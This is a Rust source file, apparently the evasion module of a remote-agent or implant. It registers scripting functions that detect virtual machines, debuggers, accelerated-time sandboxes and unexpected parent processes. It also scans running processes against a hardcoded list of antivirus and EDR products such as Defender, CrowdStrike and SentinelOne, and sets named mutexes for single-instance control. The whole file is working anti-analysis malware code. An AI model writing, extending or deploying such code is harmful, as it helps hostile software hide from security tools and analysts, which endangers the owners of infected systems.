// src/agent/scripting/evasion.rs
//
// Exposes the existing evasion/detection.rs primitives to RHAI and adds
// debugger detection, timing-based sandbox checks, and named-mutex
// single-instance guards.

use rhai::Engine;
use std::sync::{Mutex, OnceLock};
use std::collections::HashMap;

// Global store for mutex handles so they survive the duration of the script.
// Keyed by name → platform handle (stored as usize for Send-safety).
static MUTEX_STORE: OnceLock<Mutex<HashMap<String, usize>>> = OnceLock::new();

fn mutex_store() -> &'static Mutex<HashMap<String, usize>> {
    MUTEX_STORE.get_or_init(|| Mutex::new(HashMap::new()))
}

pub fn register(engine: &mut Engine) {

    // ── VM / virtualisation detection ─────────────────────────────────────────
    // Delegates directly to the existing detection::is_virtualized() logic.

    engine.register_fn("internal_vm_detect", || -> String {
        if crate::agent::evasion::detection::is_virtualized() { "true".into() } else { "false".into() }
    });

    // ── Debugger detection ────────────────────────────────────────────────────

    engine.register_fn("internal_debugger_detect", || -> String {
        let detected: bool = {
            #[cfg(target_os = "windows")]
            { unsafe { use super::win_ffi::proc_ext::IsDebuggerPresent; IsDebuggerPresent() != 0 } }
            #[cfg(target_os = "linux")]
            {
                std::fs::read_to_string("/proc/self/status")
                    .ok()
                    .and_then(|s| {
                        s.lines()
                            .find(|l| l.starts_with("TracerPid:"))
                            .and_then(|l| l.split_whitespace().nth(1))
                            .and_then(|v| v.parse::<i64>().ok())
                    })
                    .map(|pid| pid != 0)
                    .unwrap_or(false)
            }
            #[cfg(not(any(target_os = "windows", target_os = "linux")))]
            false
        };
        if detected { "true".into() } else { "false".into() }
    });

    // ── Parent process check ──────────────────────────────────────────────────
    // Returns true when the parent is NOT in the allowed list (i.e. suspicious).

    engine.register_fn("internal_parent_check", |allowed_json: &str| -> String {
        let allowed: Vec<String> = serde_json::from_str(allowed_json).unwrap_or_default();
        if crate::agent::evasion::detection::is_bad_parent(&allowed) { "true".into() } else { "false".into() }
    });

    // ── Timing-based sandbox detection ────────────────────────────────────────
    // Some sandboxes accelerate time to get past sleep() calls.
    // Returns true if a 1-second sleep consumed less than 750 ms of wall time.

    engine.register_fn("internal_timing_check", || -> String {
        let start  = std::time::Instant::now();
        std::thread::sleep(std::time::Duration::from_secs(1));
        let elapsed = start.elapsed().as_millis();
        if elapsed < 750 { "true".into() } else { "false".into() }
    });

    // ── AV / EDR process detection ────────────────────────────────────────────
    // Scans the running process list for known security product names.
    // Returns JSON array of detected product names.

    engine.register_fn("internal_av_detect", || -> String {
        const AV_NAMES: &[&str] = &[
            "MsMpEng", "msmpeng", "MpCmdRun", "NisSrv",      // Windows Defender
            "bdagent", "bdredline", "vsserv",                  // Bitdefender
            "avp", "avpui", "klnagent",                        // Kaspersky
            "savservice", "ALMon",                             // Sophos
            "CylanceSvc", "CylanceUI",                         // Cylance
            "cb", "cbdefense", "CarbonBlack",                  // Carbon Black
            "SentinelAgent", "SentinelServiceHost",            // SentinelOne
            "xagt", "xagtnotif",                               // FireEye/Trellix
            "CSFalconService", "CSFalconContainer",            // CrowdStrike
            "csc32", "csc64", "cschost",                       // Carbon Black Cloud
            "elastic-agent", "elastic-endpoint",               // Elastic
            "Cortex", "traps",                                 // Palo Alto
            "cyserver", "cyelp",                               // Cybereason
        ];
        let procs = crate::utils::get_process_list();
        let procs_lower = procs.to_lowercase();
        let found: Vec<&str> = AV_NAMES.iter()
            .filter(|&&name| procs_lower.contains(&name.to_lowercase()))
            .copied()
            .collect();
        serde_json::to_string(&found).unwrap_or("[]".into())
    });

    // ── Named mutex (single-instance guard) ───────────────────────────────────
    // Returns true if the mutex was newly created (this is the first instance).
    // Returns false if the mutex already exists (another instance is running).
    // The handle is kept alive for the process lifetime.

    engine.register_fn("internal_mutex_create", |name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            let Ok(cname) = CString::new(name) else { return "false".into() };
            unsafe {
                use super::win_ffi::proc_ext::*;
                let h = CreateMutexA(std::ptr::null_mut(), 1, cname.as_ptr());
                if h.is_null() { return "false".into(); }
                extern "system" { fn GetLastError() -> u32; }
                let err = GetLastError();
                // ERROR_ALREADY_EXISTS = 183
                if err == 183 {
                    super::win_ffi::win_ext::CloseHandle(h);
                    return "false".into();
                }
                // Store handle so it outlives this call.
                if let Ok(mut store) = mutex_store().lock() {
                    store.insert(name.to_string(), h as usize);
                }
                "true".into()
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            // Lockfile approach: O_CREAT | O_EXCL guarantees atomicity.
            let path = std::env::temp_dir().join(format!(".rcm_mutex_{}", name));
            match std::fs::OpenOptions::new().write(true).create_new(true).open(&path) {
                Ok(_)  => {
                    if let Ok(mut store) = mutex_store().lock() {
                        store.insert(name.to_string(), 1);
                    }
                    "true".into()
                }
                Err(_) => "false".into(),
            }
        }
    });

    engine.register_fn("internal_mutex_exists", |name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            let Ok(cname) = CString::new(name) else { return "false".into() };
            unsafe {
                use super::win_ffi::proc_ext::*;
                let h = OpenMutexA(MUTEX_ALL_ACCESS, 0, cname.as_ptr());
                if h.is_null() { return "false".into(); }
                super::win_ffi::win_ext::CloseHandle(h);
                "true".into()
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            if std::env::temp_dir().join(format!(".rcm_mutex_{}", name)).exists() {
                "true".into()
            } else {
                "false".into()
            }
        }
    });

    engine.register_fn("internal_mutex_release", |name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            if let Ok(mut store) = mutex_store().lock() {
                if let Some(h) = store.remove(name) {
                    unsafe { super::win_ffi::win_ext::CloseHandle(h as *mut std::ffi::c_void); }
                    return "Released".into();
                }
            }
            "Not found".into()
        }
        #[cfg(not(target_os = "windows"))]
        {
            let path = std::env::temp_dir().join(format!(".rcm_mutex_{}", name));
            match std::fs::remove_file(&path) {
                Ok(_)  => "Released".into(),
                Err(e) => format!("Error: {}", e),
            }
        }
    });
}
